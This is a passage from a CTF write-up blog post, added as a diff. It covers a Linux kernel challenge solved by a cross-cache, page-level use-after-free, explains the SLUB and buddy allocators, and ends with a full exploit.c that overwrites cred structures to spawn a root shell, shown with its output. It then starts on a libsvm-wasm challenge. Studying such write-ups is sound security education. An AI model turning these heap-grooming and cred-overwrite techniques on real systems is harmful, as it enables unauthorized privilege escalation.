+	 * growth of the list. For simplicity we assume that the slabs will
+	 * be half-full.
+	 */
+	nr_slabs = DIV_ROUND_UP(nr_objects * 2, oo_objects(s->oo));
+	s->cpu_partial_slabs = nr_slabs;
+}
+```
+
+`oo_objects(s->oo){:c}` resolves to the total number of objects that can fit in
+1 slab. So, for example, the `temporal_event_cache{:c}` has
+`cpu_partial_slabs{:c}` member set to `120 * 2 / 0x24` which rounds up to 7, so
+7 partial slabs is the maximum for cpu partial list.
+
+For `min_partial{:c}`, it is set like this:
+
+```c title="mm/slub.c"
+#define MAX_PARTIAL 10
+#define MIN_PARTIAL 5
+
+int do_kmem_cache_create(struct kmem_cache *s, const char *name,
+			 unsigned int size, struct kmem_cache_args *args,
+			 slab_flags_t flags)
+{
+  // ...
+	/*
+	 * The larger the object size is, the more slabs we want on the partial
+	 * list to avoid pounding the page allocator excessively.
+	 */
+	s->min_partial = min_t(unsigned long, MAX_PARTIAL, ilog2(s->size) / 2);
+	s->min_partial = max_t(unsigned long, MIN_PARTIAL, s->min_partial);
+
+	set_cpu_partial(s); // this is where cpu_partial_slabs is set
+  // ...
+}
+```
+
+So for example, the `temporal_event_cache->min_partial{:c}` is set to:
+
+```c
+max(MIN_PARTIAL, min(MAX_PARTIAL, ilog2(0x70) / 2));
+```
+
+which is just 5 because `ilog2(0x70) / 2{:c}` is 3, which is smaller than
+`MIN_PARTIAL{:c}`. So the node partial list for `temporal_event_cache{:c}` can
+hold a maximum of 5 partial slabs.
+
+---
+
+Now we've covered the SLUB allocator, we should take a quick look at the buddy
+allocator as well. As above, feel free to skip ahead to
+[here](#doing-cross-cache-the-proper-way) if you're already familiar with buddy!
+
+### Buddy allocator
+
+The buddy allocator is much much more complex than the SLUB allocator, but for
+brevity's sake, we'll focus on only the most essential elements of the buddy.
+This is the entrypoint to allocating pages in the buddy:
+
+```c title="include/linux/gfp.h
+#define alloc_pages(...)			alloc_hooks(alloc_pages_noprof(__VA_ARGS__))
+
+static inline struct page *alloc_pages_noprof(gfp_t gfp_mask, unsigned int order)
+{
+	return alloc_pages_node_noprof(numa_node_id(), gfp_mask, order);
+}
+
+static inline struct page *alloc_pages_node_noprof(int nid, gfp_t gfp_mask,
+						   unsigned int order)
+{
+	if (nid == NUMA_NO_NODE)
+		nid = numa_mem_id();
+
+	return __alloc_pages_node_noprof(nid, gfp_mask, order);
+}
+
+static inline struct page *
+__alloc_pages_node_noprof(int nid, gfp_t gfp_mask, unsigned int order)
+{
+	VM_BUG_ON(nid < 0 || nid >= MAX_NUMNODES);
+	warn_if_node_offline(nid, gfp_mask);
+
+	return __alloc_pages_noprof(gfp_mask, order, nid, NULL);
+}
+```
+
+Finally we enter `__alloc_pages_noprof{:c}`. The fast path allocation enters the
+`get_page_from_freelist{:c}` function, where after a long series of checks and
+stuff, we reach the `rmqueue{:c}` function. In here, we attempt to get a page
+from the per-cpu pageset (or pcplist) of the requested order.
+(`rmqueue_buddy{:c}`) Similar to the per-cpu cache for SLUB, the per-cpu pageset
+is specific to the cpu that the kernel thread is running on, and helps to reduce
+lock-taking. However, this means that we cannot allocate pages that are in CPU0
+pcplist when we're on CPU1. If there are no pages in pcplist, then we get the
+page from the buddy allocator itself.
+
+Similarly, for freeing of pages, pages that fulfill the criteria `order <= 3 ||
+order == HPAGE_PMD_ORDER{:c}` will be placed in pcplist via
+`free_unref_page_commit{:c}`. In this function:
+
+```c
+static void free_unref_page_commit(struct zone *zone, struct per_cpu_pages *pcp,
+				   struct page *page, int migratetype,
+				   unsigned int order)
+{
+	int high, batch;
+	int pindex;
+	bool free_high = false;
+
+	/*
+	 * On freeing, reduce the number of pages that are batch allocated.
+	 * See nr_pcp_alloc() where alloc_factor is increased for subsequent
+	 * allocations.
+	 */
+	pcp->alloc_factor >>= 1;
+	__count_vm_events(PGFREE, 1 << order);
+	pindex = order_to_pindex(migratetype, order);
+	list_add(&page->pcp_list, &pcp->lists[pindex]);
+	pcp->count += 1 << order;
+
+	batch = READ_ONCE(pcp->batch);
+	/*
+	 * As high-order pages other than THP's stored on PCP can contribute
+	 * to fragmentation, limit the number stored when PCP is heavily
+	 * freeing without allocation. The remainder after bulk freeing
+	 * stops will be drained from vmstat refresh context.
+	 */
+	if (order && order <= PAGE_ALLOC_COSTLY_ORDER) {
+		free_high = (pcp->free_count >= batch &&
+			     (pcp->flags & PCPF_PREV_FREE_HIGH_ORDER) &&
+			     (!(pcp->flags & PCPF_FREE_HIGH_BATCH) ||
+			      pcp->count >= READ_ONCE(batch)));
+		pcp->flags |= PCPF_PREV_FREE_HIGH_ORDER;
+	} else if (pcp->flags & PCPF_PREV_FREE_HIGH_ORDER) {
+		pcp->flags &= ~PCPF_PREV_FREE_HIGH_ORDER;
+	}
+	if (pcp->free_count < (batch << CONFIG_PCP_BATCH_SCALE_MAX))
+		pcp->free_count += (1 << order);
+	high = nr_pcp_high(pcp, zone, batch, free_high);
+	if (pcp->count >= high) {
+		free_pcppages_bulk(zone, nr_pcp_free(pcp, batch, high, free_high),
+				   pcp, pindex);
+		if (test_bit(ZONE_BELOW_HIGH, &zone->flags) &&
+		    zone_watermark_ok(zone, 0, high_wmark_pages(zone),
+				      ZONE_MOVABLE, 0))
+			clear_bit(ZONE_BELOW_HIGH, &zone->flags);
+	}
+}
+```
+
+If there are too many pages in the per-cpu pageset, then
+`free_pcppages_bulk{:c}` is called which releases the pcp list back to buddy
+allocator. I tried to control this but it's quite difficult to do so due to the
+ubiquitous nature of pages in the entire kernel and OS.
+
+---
+
+### Doing cross-cache the proper way
+
+That was not a small detour at all, but now we understand enough of SLUB and
+buddy allocator to plan our cross-cache!
+
+Our current conundrum is that our victim object is stuck in the cpu cache for
+CPU0, but we cannot perform any actions in our exploit on CPU0, since the kernel
+thread is hogging it. First, we want to get the victim slab out of the cpu
+partial list into the node partial list, so that it can be freed.
+
+We can set up the cpu partial list so it looks like this:
+
+![cpu partial list
+layout](@images/2025/starlabs-summer-pwnables/cpu-partial-layout.png)
+
+On freeing the first object from the victim slab, the cpu partial list is
+flushed and all 8 pages go into node partial. Hmm... this isn't ideal, because
+the first 7 pages are all empty, and they'll be freed when moving into node
+partial, leaving our victim slab as the only partial slab left in node. We want
+the node partial layout to look like this:
+
+![node partial layout](@images/2025/starlabs-summer-pwnables/node-partial-layout.png)
+
+This way, when the last object, victim_obj, is freed in victim slab making
+victim slab empty, it will also cause victim slab to be freed back to the buddy
+allocator. This seems solid, so let's plan out how we can do this.
+
+To prevent the last 4 pages from being freed when we move them to node partial,
+we can assign a timeline to each event in the slab save 1. Timelines are only
+freed after all the events have been iterated through, so the refcount for these
+events with the timeline won't reach 0 prematurely. Then, when we close the file
+descriptor, the last 4 pages will only have 1 free object, and hence will not be
+considered empty.
+
+With this setup, we now have the victim slab inside CPU0's pcplist. However,
+this is slightly problematic as we cannot reliably flush CPU0's pcplist, and
+CPU1 cannot claim pages from CPU0's pcplist.
+
+Tweaking our exploit slightly, we can open a second fd, and use that to allocate
+an object on our victim slab. That way, we can separately close this fd on CPU1,
+and make the victim slab empty on CPU1 instead, and thus cause the slab to enter
+CPU1's pcplist. This is a high-level overview of our slab feng shui process:
+
+#### Step 1
+
+![Step 1](@images/2025/starlabs-summer-pwnables/step1.png)
+
+Open fd2 on CPU1 and allocate 7 pages. We want these pages on fd2, so that later
+on, we can spray CPU1 with empty pages and cause CPU1's partial list to
+overflow, putting many empty pages into the node partial list.
+
+#### Step 2
+
+![Step 2](@images/2025/starlabs-summer-pwnables/step2.png)
+
+Open fd on CPU0 and allocate the pages as such. The blue boxes indicate events
+that own a timeline. There is 1 more empty slot for fd2 to claim.
+
+#### Step 3
+
+![Step 3](@images/2025/starlabs-summer-pwnables/step3.png)
+
+Claim the empty slot on fd2, which makes victim slab a full slab. On fd, we
+claim 1 more dummy event so that victim slab is removed from active slab.
+
+#### Step 4
+
+![Step 4](@images/2025/starlabs-summer-pwnables/step4.png)
+
+Close fd resulting in the following configuration for the node partial list.
+After sleeping for a while, close fd2, which pushes many slabs into node
+partial, and causes victim slab to be freed to pcplist of CPU1.
+
+---
+
+With this, we've halfway done with our cross-cache! Our victim page is waiting
+for us in pcplist CPU1, and we can reclaim it in a variety of ways. However,
+looking at the object size of 0x70 makes me quite uneasy. It's a really odd
+object size and I haven't come across any commonly-exploited kernel objects that
+use this size. Furthermore, the conditions to trigger the 2nd free are specific:
+the victim's refcount must be set to a positive integer, and the
+`causal_dependency` pointer cannot be overwritten (if refcount is 0x1, then it
+can be set to NULL instead). Furthermore, I don't know the offset of the victim
+object in the victim slab, which complicates things even when using powerful
+objects like msg_msg to overwrite the entire slab, because I need to overwrite
+refcount but not `causal_dependency`.
+
+In fact, something like `pipe_buffer`'s backing page would be quite nice for
+this, because I can sequentially increase the overwrite until I hit my victim
+object. But our primitive is that the victim object will be kfree'd again, so
+does this really help?
+
+## Page-level UAF
+
+Keen-eyed readers may have noticed that I left the `__kmalloc_large_noprof{:c}`
+and `free_large_kmalloc{:c}` function calls in the snippets of `kmalloc{:c}` and
+`kfree{:c}` respectively, [back here](#slub-allocator). Turns out, there is
+another kind of object allocated by `kmalloc{:c}`; when the desired size is too
+large, instead of creating a new kmalloc cache for this large-sized object, the
+kernel decides to fall back to the buddy allocator instead, returning a compound
+page for this allocation request. A folio is a struct pointing to the head of a
+compound page. So when this pointer is passed to `kfree{:c}`, it first resolves
+the folio of the supplied pointer, and determines if the folio is also a slab.
+If it's not a slab, then it assumes that it's a large kmalloc pointer, and goes
+ahead to free the entire compound page. The neat part is, this pointer doesn't
+need to be aligned to any address! As long as it's in a page (which it always
+will be) the kernel will resolve the folio address and pass it to
+`free_large_kmalloc{:c}`.
+
+This is our new powerful primitive; with the controlled free on the victim
+object, we can free the victim pipe_buffer's backing page, and later on allocate
+this page for other purposes, greatly increasing our read and write capability
+as we can perform both operations via the victim pipe_buffer.
+
+---
+
+To carry this out, we allocate a pipe_buffer before the start of the exploit, so
+that the actual pipe_buffer slab doesn't accidentally claim our victim page.
+There's no need to spray many pipe_buffers as the victim page will be used to
+serve the 1st allocation request.
+
+Then, after successfully closing fd2, we allocate pages for all the pipe_buffers
+we sprayed initially by writing some data into their buffer. Now the
+pipe_buffer's backing page will be overlaid with the victim slab, and we can
+start overwriting the objects. To reset the seek pointer, we can read however
+many bytes we initially wrote into the page, moving the seek pointer back to
+0x0.
+
+We then supply each pipe_buffer with data until we overwrite the refcount member
+of the first event (+0x10). We wait for a period of time to see if fd was closed
+(fd closing indicates that the infinite loop has exited, which means we have
+overwritten the refcount for the victim object). If not, we write null bytes
+until the next event object slot, and repeat this process until fd closes.
+
+A small caveat: when setting the refcount, there is quite a significant chance
+that `refcount_dec_and_test` completely ignores the new refcount value and sets
+it back to 0xc0000000. I suspect this occurs during the racy process here:
+
+```c title="include/linux/refcount.h"
+static inline __must_check __signed_wrap
+bool __refcount_sub_and_test(int i, refcount_t *r, int *oldp)
+{
+	int old = atomic_fetch_sub_release(i, &r->refs);
+
+  // race window begins
+	if (oldp)
+		*oldp = old;
+
+	if (old > 0 && old == i) {
+		smp_acquire__after_ctrl_dep();
+		return true;
+	}
+
+	if (unlikely(old <= 0 || old - i < 0))
+		refcount_warn_saturate(r, REFCOUNT_SUB_UAF);
+
+  // race window ends
+	return false;
+}
+```
+
+There is a small race window between reading the value and setting the value to
+0xc0000000. However, since the window is small and we can't do much about it, we
+can just keep re-running the exploit until we manage to "un-race" the race
+condition. If we really wanted to make it work having to manually re-run the
+exploit, we could probably attempt to overwrite the refcount multiple times for
+each object, but that would make our exploit take really long to run.
+
+## Actual cross-cache
+
+Finally, we can target the slab of some struct to get root! What we want to do
+is to allocate a slab onto our victim pipe_buffer's page, spraying that slab
+with many target objects. Then, we can just write into the start of the
+pipe_buffer as it's guaranteed to have an object there after we spray
+sufficiently.
+
+Right now, we don't have any leaks, so a data-only attack would be quite nice.
+Here are the different structs I tried:
+
+1. `struct timerfd_ctx{:c}`: can get kbase and kheap leak, and control rip by
+   overwriting `hrtimer_restart{:c}` member of `struct hrtimer{:c}` before the
+   timer expires. However, I couldn't find enough gadgets for a good ROP chain, so
+   I decided against this.
+
+2. `struct file{:c}`: can perform data-only attack on the file perms. However,
+   there was no suid binaries on the fs so `/etc/passwd` didn't work, and at that
+   point I didn't think of writing a backdoor into `/bin/busybox` and running it
+   using `/sbin/modprobe`.
+
+3. `struct cred{:c}`: can perform data-only attack on the pid of the process
+   running. Initially, I didn't know how to spray this struct reliably because it
+   is very noisy to spray it with `fork(){:c}`, as a lot of userland pages are also
+   created. Afterwards, I remembered [this
+   article](https://idek.team/blog/oob-write-to-page-uaf-lactf-2025/#privilege-escalation)
+   I read about a similar page-level UAF, and I went to check how they got root.
+   Turns out they also targeted `struct cred{:c}`! To solve the noisy page spray
+   issue, they used `setuid(){:c}` to do a temporary cred spray instead. This
+   instance of cred is freed after a short while, but it doesn't matter because
+   we've claimed the page for the cred_jar cache to use. Now we can simply spray
+   `fork()` and repeatedly use our write primitive to edit the uid to 0x0,
+   gaining root privileges on one of the forked processes.
+
+There are quite a few members that control the uid of the process, so I just
+overwrote all of them from 0x3e8 (1000) to 0x0. The `cred->usage{:c}` field was
+initially set to 2, so I left it as 0x2 as well.
+
+```c title="include/linux/cred.h"
+struct cred {
+	atomic_long_t	usage;
+	kuid_t		uid;		/* real UID of the task */
+	kgid_t		gid;		/* real GID of the task */
+	kuid_t		suid;		/* saved UID of the task */
+	kgid_t		sgid;		/* saved GID of the task */
+	kuid_t		euid;		/* effective UID of the task */
+	kgid_t		egid;		/* effective GID of the task */
+	kuid_t		fsuid;		/* UID for VFS ops */
+	kgid_t		fsgid;		/* GID for VFS ops */
+	unsigned	securebits;	/* SUID-less security management */
+	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
+	kernel_cap_t	cap_permitted;	/* caps we're permitted */
+	kernel_cap_t	cap_effective;	/* caps we can actually use */
+	kernel_cap_t	cap_bset;	/* capability bounding set */
+	kernel_cap_t	cap_ambient;	/* Ambient capability set */
+#ifdef CONFIG_KEYS
+	unsigned char	jit_keyring;	/* default keyring to attach requested
+					 * keys to */
+	struct key	*session_keyring; /* keyring inherited over fork */
+	struct key	*process_keyring; /* keyring private to this process */
+	struct key	*thread_keyring; /* keyring private to this thread */
+	struct key	*request_key_auth; /* assumed request_key authority */
+#endif
+#ifdef CONFIG_SECURITY
+	void		*security;	/* LSM security */
+#endif
+	struct user_struct *user;	/* real user ID subscription */
+	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
+	struct ucounts *ucounts;
+	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
+	/* RCU deletion */
+	union {
+		int non_rcu;			/* Can we skip RCU deletion? */
+		struct rcu_head	rcu;		/* RCU deletion hook */
+	};
+} __randomize_layout;
+```
+
+## Exploit
+
+```c title="exploit.c"
+#define _GNU_SOURCE
+#include <assert.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <stdarg.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <time.h>
+#include <unistd.h>
+#include <sched.h>
+#include <sys/resource.h>
+#include <semaphore.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <sys/mman.h>
+#include <sys/msg.h>
+#include <sys/timerfd.h>
+
+int fd = 0;
+int fd2 = 0;
+size_t child_pid;
+ 
+void pprintf(char *str, ...) {
+  printf("[*] ");
+  va_list args;
+  va_start(args, str);
+  vprintf(str, args);
+  printf("\n");
+}
+ 
+void pprintfc(char *str, ...) {
+  printf("\33[2K\r[*] ");
+  va_list args;
+  va_start(args, str);
+  vprintf(str, args);
+}
+ 
+ 
+void ppause(char *str, ...) {
+  printf("[-] ");
+  va_list args;
+  va_start(args, str);
+  vprintf(str, args);
+  printf("\n");
+  getchar();
+}
+ 
+void open_dev() {
+  fd = open("/dev/paradox_engine", O_RDWR);
+}
+
+void open_dev_2() {
+  fd2 = open("/dev/paradox_engine", O_RDWR);
+}
+ 
+size_t user_cs, user_ss, user_sp, user_rflags;
+void save_state() {
+  __asm__(
+      ".intel_syntax noprefix;"
+      "mov user_cs, cs;"
+      "mov user_ss, ss;"
+      "mov user_sp, rsp;"
+      "pushf;"
+      "pop user_rflags;"
+      ".att_syntax;"
+  );
+}
+
+#define PARADOX_CREATE_TIMELINE 0xc0186b01
+#define PARADOX_CREATE_EVENT 0xc0586b02
+ 
+struct {
+    size_t cause_timeline_id, cause_event_id;
+    size_t new_timeline_id;
+} timeline_req;
+
+struct {
+	size_t target_timeline_id;
+	size_t cause_event_id;
+	char description[64];
+	size_t new_event_id;
+} event_req;
+
+cpu_set_t cpu_set;
+
+#define cred_spray 0x40
+void spray_cred() {
+  for (int i = 0; i < cred_spray; i++) {
+    setuid(1000);
+  }
+}
+
+void get_shell() {
+  for (int i = 0x0; i < 0x50; i++) {
+    if (!fork()) {
+      while (getuid() != 0) {}
+      pprintf("got root!");
+      system("/bin/sh");
+      pprintf("done");
+    }
+  }
+  while(1) {};
+}
+
+size_t buf[0x1000];
+#define pipe_buf_spray 0x1
+int pipe_bufs[pipe_buf_spray][2];
+void spray_pipe_buffers() {
+  for (int i = 0; i < pipe_buf_spray; i++) {
+    pipe(pipe_bufs[i]);
+  }
+}
+void alloc_page_pipe_buffers(int *target_pipe_buffer) {
+  for (int i = 0; i < 0x24; i++) {
+    ((size_t *)buf)[i * 14] = 0xdeadbeef;
+    ((size_t *)buf)[1 + i * 14] = 0x400000; // refcount
+  }
+  for (int i = 0; i < pipe_buf_spray; i++) {
+    for (int j = 0; j < 0x24; j++) {
+      int status = waitpid(child_pid, NULL, WNOHANG);
+      if (status != 0) {
+        *target_pipe_buffer = i;
+        pprintf("child status %d", status);
+        return;
+      } else {
+        write(pipe_bufs[i][1], &buf[i*14], 0x10);
+        pprintf("%d", i);
+        usleep(100000);
+        // ppause("check");
+        write(pipe_bufs[i][1], &buf[i*14+2], 0x60);
+      }
+    }
+    // also check at end of loop
+    int status = waitpid(child_pid, NULL, WNOHANG);
+    if (status != 0) {
+      *target_pipe_buffer = i;
+      pprintf("child status %d", status);
+      return;
+    }
+  }
+}
+void free_pipe_buffer(int target_idx) {
+  close(pipe_bufs[target_idx][0]);
+  close(pipe_bufs[target_idx][1]);
+}
+
+int main() {
+  // ensure we only allocate to cpu0 cache
+  size_t pid = getpid();
+  CPU_ZERO(&cpu_set);
+  CPU_SET(0, &cpu_set);
+  sched_setaffinity(pid, sizeof(cpu_set), &cpu_set);
+
+  save_state();
+
+  pprintf("spray pipe_buffer");
+  spray_pipe_buffers();
+
+  // this is needed because skbuff_ext_cache is apparently allocated
+  // before cred, but only once
+  setuid(1000);
+  pprintf("did setuid once to allocate skbuff_ext_cache");
+
+  open_dev();
+  pprintf("opened device on %d, starting exploit", fd);
+
+  // open fd2
+  CPU_ZERO(&cpu_set);
+  CPU_SET(1, &cpu_set);
+  sched_setaffinity(pid, sizeof(cpu_set), &cpu_set);
+  open_dev_2();
+  // 7 pages to flush cpu_partial; these must be be freed
+  for (int i = 0; i < 0x24 * 8; i++) {
+    event_req.target_timeline_id = 0;
+    event_req.cause_event_id = 0;
+    strcpy(event_req.description, "cpu1");
+    ioctl(fd2, PARADOX_CREATE_EVENT, &event_req);
+    if (i % 0x24 != 0) {
+      timeline_req.cause_event_id = i + 1;
+      timeline_req.cause_timeline_id = 0;
+      ioctl(fd, PARADOX_CREATE_TIMELINE, &timeline_req);
+    }
+  }
+
+  CPU_ZERO(&cpu_set);
+  CPU_SET(0, &cpu_set);
+  sched_setaffinity(pid, sizeof(cpu_set), &cpu_set);
+  size_t next_event_id = 0x1;
+
+  // fill up 7 pages
+  // max pages in per_cpu partial list is 7 pages (https://elixir.bootlin.com/linux/v6.12.38/source/mm/slub.c#L5266)
+  // max pages in node partial list is 5 pages (https://elixir.bootlin.com/linux/v6.12.38/source/mm/slub.c#L6043)
+  // ilog2(0x70) / 2 == 3
+  // but MIN_PARTIAL == 5 > 3
+  // for 4 pages only free 1 so the page doesn't become empty
+  // for 3 pages free all so the page is empty
+  for (int i = 0; i < 7; i++) {
+    size_t max;
+    if (i == 0) {
+      max = 0x23;
+    } else {
+      max = 0x24;
+    }
+    for (int j = 0; j < max; j++) {
+      event_req.target_timeline_id = 0;
+      event_req.cause_event_id = 0;
+      strcpy(event_req.description, "filler");
+      ioctl(fd, PARADOX_CREATE_EVENT, &event_req);
+      // keep only 4 pages partial
+      // the rest (3) must be free before victim is so that victim page doesn't get freed prematurely in node partial
+      // so when the 8th page enters cpu_partial,
+      // 3 pages will be freed before victim is freed,
+      // 4 pages left (excluding victim) in node partial
+      // then on cpu1 we can induce more pages to go into node partial so victim get freed on cpu1
+      if (i < 3 && j != 0) { // only free the first object from each page
+        timeline_req.cause_event_id = next_event_id;
+        timeline_req.cause_timeline_id = 0;
+        ioctl(fd, PARADOX_CREATE_TIMELINE, &timeline_req);
+      // } else {
+      //   pprintf("%d", next_event_id);
+      }
+      next_event_id++;
+    }
+  }
+  pprintf("full page events created");
+
+  // fill the victim cache with events
+  for (int i = 0; i < 0x22; i++) {
+    event_req.target_timeline_id = 0;
+    if (i == 1) {
+      event_req.cause_event_id = 1;
+      // pprintf("%d", 1);
+    } else if (i < 7) {
+      // make victim slab part of the first 7 per_cpu pages
+      // by keeping the filler pages full
+      // so when we put the 8th page into per_cpu partial list, 
+      // victim slab goes into node partial list
+      event_req.cause_event_id = (i - 1) * 0x24;
+      // pprintf("%d", (i - 1) * 0x24);
+    } else {
+      event_req.cause_event_id = 0;
+    }
+    strcpy(event_req.description, "hmm");
+    ioctl(fd, PARADOX_CREATE_EVENT, &event_req);
+    next_event_id++;
+  }
+  // an event allocated on victim slab, on fd2
+  // this will be freed on cpu1, causing the entire page to be freed
+  event_req.target_timeline_id = 0;
+  event_req.cause_event_id = 0;
+  strcpy(event_req.description, "cpu1");
+  ioctl(fd2, PARADOX_CREATE_EVENT, &event_req);
+  ppause("get victim addr");
+
+  // create the victim event
+  size_t victim_event_id = next_event_id;
+  event_req.target_timeline_id = 0;
+  event_req.cause_event_id = victim_event_id;
+  strcpy(event_req.description, "victim 0");
+  ioctl(fd, PARADOX_CREATE_EVENT, &event_req);
+
+  // one more to move victim cache out of active slab
+  event_req.target_timeline_id = 0;
+  event_req.cause_event_id = 0;
+  strcpy(event_req.description, "plus one");
+  ioctl(fd, PARADOX_CREATE_EVENT, &event_req);
+  next_event_id++;
+
+  // what happens on freeing?
+  // the first 4 pages are still full, so not placed in cpu partial
+  // the last 3 pages are partial, so placed in cpu_partial (3)
+  // the victim page is first freed, placing it in cpu_partial (4)
+  // each object free releases the causal dependency so adds one of the previous pages in
+  // (5)
+  // (6)
+  // (7)
+  // (8) - at this point, cpu partial is full and must be flushed to node partial (__put_partials)
+
+  child_pid = fork();
+  if (!child_pid) {
+    size_t pid = getpid();
+    CPU_ZERO(&cpu_set);
+    CPU_SET(0, &cpu_set);
+    sched_setaffinity(pid, sizeof(cpu_set), &cpu_set);
+    close(fd2);
+    sleep(1);
+
+    pprintf("fd closed successfully %d", close(fd)); // will get stuck on infinite loop
+    exit(0);
+  } else {
+    // don't get hung up by parent thread
+    size_t pid = getpid();
+    CPU_ZERO(&cpu_set);
+    CPU_SET(1, &cpu_set);
+    sched_setaffinity(pid, sizeof(cpu_set), &cpu_set);
+    close(fd);
+    sleep(1);
+    pprintf("victim cache should be in node partial list now");
+
+    // now free cpu1 heap
+    close(fd2);
+    pprintf("victim slab in pcp cpu1");
+
+    int target_idx = 0;
+    pprintf("alloc page for pipe_buffer");
+    alloc_page_pipe_buffers(&target_idx);
+
+    CPU_ZERO(&cpu_set);
+    CPU_SET(0, &cpu_set);
+    sched_setaffinity(pid, sizeof(cpu_set), &cpu_set);
+
+    // when released, our pipe_buffer page should now be freed
+    // reclaim with another pipe_buffer to get uaf on the page
+    ((size_t *)buf)[0] = 0xf00dbabe;
+    ((size_t *)buf)[1] = 0xf00dbabe;
+    int attacker_pipe_buf[2];
+    pipe(attacker_pipe_buf);
+    write(attacker_pipe_buf[1], buf, 0x10);
+    pprintf("victim page overwritten by attacker_pipe_buf's page");
+
+    free_pipe_buffer(target_idx);
+    pprintf("original pipe_buffer freed");
+
+    spray_cred();
+    sleep(1);
+    pprintf("victim page overwritten by cred");
+    read(attacker_pipe_buf[0], buf, 0x10);
+    if (((size_t *)buf)[1] != 0x000003e8000003e8) {
+      pprintf("failed to allocate cred over victim, restart exploit");
+      exit(-1);
+    }
+
+    if (!fork()) {
+      get_shell();
+    }
+
+    sleep(1);
+    pprintf("new cred in top of victim cache");
+
+    memset(buf, 0, sizeof(buf));
+    ((size_t *)buf)[0] = 0x2;
+    write(attacker_pipe_buf[1], buf, 0x28);
+
+    pprintf("check cred overwritten");
+    while (1) {}
+  }
+}
+```
+
+```
+./exploit
+[*] spray pipe_buffer
+[*] did setuid once to allocate skbuff_ext_cache
+[*] opened device on 5, starting exploit
+[*] full page events created
+[*] victim cache should be returned to buddy now
+[*] victim slab in pcp cpu1
+[*] alloc page for pipe_buffer
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] 0
+[*] fd closed successfully 0
+[*] child status 737
+[*] victim page overwritten by attacker_pipe_buf's page
+[*] original pipe_buffer freed
+[*] victim page overwritten by cred
+[*] new cred in top of victim cache
+[*] check cred overwritten
+[*] got root!
+/tmp # $ whoami
+whoami
+root
+/tmp # $ cat /flag
+cat /flag
+Congrats for solving STAR Labs kernel CTF challenge!
+Here is your flag: flag{6854fd87bad65c12a28a1a2fc3fd527b}
+Please send exploit code and writeup to info@starlabs.sg
+/tmp # $
+```
+
+# Challenge #003
+
+<Challenge
+  title="Zero Day Pwnable"
+  solves={4}
+  flag="flag{a7866720ad35a8814ad482249c6d7be63a36e3c1fda47d90a85381494aa5edf3}"
+  files={[{name: "zero-day-pwnable.zip", url: "https://github.com/star-sg/challenges/raw/refs/heads/main/Aug%202025/zero-day-pwnable.zip"}]}>
+
+"_We need more AI!_" - every boss ever
+
+Your company jumped on the AI bandwagon and tasked you with building something "revolutionary." So naturally, you grabbed the first shiny library you could find - libsvm-wasm - and cobbled together a model training server for your team.
+
+It seemed like such a good idea at the time... 🤔
+
+But now you're starting to wonder: What could go wrong? (Spoiler alert: probably everything)
+
+Time to put on your security researcher hat and find out just how "intelligent" this artificial intelligence really is. Can you discover the vulnerability hiding in your rushed AI implementation?
+
+</Challenge>
+
+This challenge hosted a [wasm API of
+libsvm](https://github.com/WenheLI/libsvm-wasm) and exposed certain parameters
+to us. The wasm fork is patched as follows:
+
+```patch
+diff --git a/Makefile b/Makefile
+index cc1ff49..1ec5306 100644
+--- a/Makefile
++++ b/Makefile
+@@ -1,9 +1,9 @@
+ CC = emcc
+ CXX = em++
+ 
+-CFLAGS = -Wall -Wconversion -O3 -fPIC --memory-init-file 0
++CFLAGS = -Wall -Wconversion -O3 -fPIC
+ BUILD_DIR = dist/
+-EMCCFLAGS = -s ASSERTIONS=2 -s "EXPORT_NAME=\"SVM\"" -s MODULARIZE=1 -s DISABLE_EXCEPTION_CATCHING=0 -s NODEJS_CATCH_EXIT=0  -s WASM=1 -s ALLOW_MEMORY_GROWTH=1 -s EXPORTED_RUNTIME_METHODS='["cwrap", "getValue","stringToUTF8"]'
++EMCCFLAGS = -s ASSERTIONS=2 -s "EXPORT_NAME=\"SVM\"" -s MODULARIZE=1 -s DISABLE_EXCEPTION_CATCHING=0 -s NODEJS_CATCH_EXIT=0  -s WASM=1 -s ALLOW_MEMORY_GROWTH=1 -s EXPORTED_RUNTIME_METHODS='["cwrap", "getValue","stringToUTF8","HEAPF64","HEAP32"]' -sEXPORTED_FUNCTIONS="['_malloc', '_free']"
+ 
+ all: wasm
+ 
+@@ -13,7 +13,7 @@ svm.o: libsvm/svm.cpp libsvm/svm.h
+ wasm: libsvm-wasm.c svm.o libsvm/svm.h
+ 		rm -rf $(BUILD_DIR); 
+ 		mkdir -p $(BUILD_DIR);
+-		$(CC) $(CFLAGS) libsvm-wasm.c svm.o -o $(BUILD_DIR)/libsvm.js $(EMCCFLAGS) -lnodefs.js
++		$(CC) $(CFLAGS) libsvm-wasm.c svm.o -o $(BUILD_DIR)/libsvm.js $(EMCCFLAGS) -lnodefs.js --pre-js pre.js
+ 		cp ./libsvm.d.ts ./dist/libsvm.d.ts
+ 
+ clean: 
+```
+
+Honestly, I'm not too sure what the patched build flags do, but the inclusion
+of `pre.js`:
+
+```js
+var Module = {
+  preRun: [function() {
+    ENV.FLAG = process.env.FLAG || 'default_flag';
+  }]
+};
+```
+
+basically loads the flag into the wasm's env vars at some location. This means
+we don't need to get RCE, we just need to read the flag somehow.
+
+## Analysis
+
+Our codebase is quite large now, because the vulnerability could be in the
+libsvm-wasm patch, or in the web application, or in libsvm itself, or a
+combination of all three. Let's take a look at libsvm-wasm to understand what it
+does first.
+
+### libsvm-wasm
+
+The functions directly exposed to our web app can be found in `src/index.ts`
+[here](https://github.com/WenheLI/libsvm-wasm/blob/master/src/index.ts). Some
+of these functions call the wasm API which can be found at `libsvm-wasm.c`
+[here](https://github.com/WenheLI/libsvm-wasm/blob/master/libsvm-wasm.c).
+
+Our web app calls these functions:
+
+- `svm.init(){:js}`
+- `svm.feedSamples(data, labels){:js}`
+- `svm.train(){:js}`
+- `svm.save(outputFilename){:js}`
+
